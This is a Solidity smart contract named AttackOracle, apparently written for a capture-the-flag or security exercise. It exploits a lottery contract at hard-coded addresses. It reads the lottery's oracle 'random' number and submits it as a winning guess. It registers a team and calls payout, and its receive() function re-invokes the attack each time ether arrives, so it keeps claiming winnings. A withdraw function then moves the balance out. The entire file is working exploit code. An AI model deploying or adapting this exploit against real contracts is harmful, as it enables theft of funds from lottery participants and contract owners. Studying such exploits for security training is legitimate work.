// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

interface ILottery {
    function registerTeam(address _walletAddress, string calldata _teamName, string calldata _password) external payable;
    function makeAGuess(address _team, uint256 _guess) external returns (bool);
    function payoutWinningTeam(address _team) external returns (bool);
}

interface IOracle {
    function getRandomNumber() external view returns (uint256);
}

contract AttackOracle { 
    ILottery lottery;
    IOracle oracle; 
    address lotteryAddress = 0x44962eca0915Debe5B6Bb488dBE54A56D6C7935A;
    address oracleAddress = 0x0d186F6b68a95B3f575177b75c4144A941bFC4f3;

    constructor() payable {
        lottery = ILottery(lotteryAddress);
        oracle = IOracle(oracleAddress);
    }

    /*
    * Call this function with higher gas limit
    */
    function attack() public {
        lottery.makeAGuess(address(this), oracle.getRandomNumber());
        lottery.payoutWinningTeam(address(this));    
    }

    function registration() external payable {
        lottery.registerTeam{value: 1000000000 wei}(address(this), "Testing_Team", "Password");

    }

    function withdraw(address payable payout) public {
        (bool success, ) = address(payout).call{value: address(this).balance}('');
        require(success, "Failed to withdraw");
    }

    receive() external payable {
         attack();   
    }
}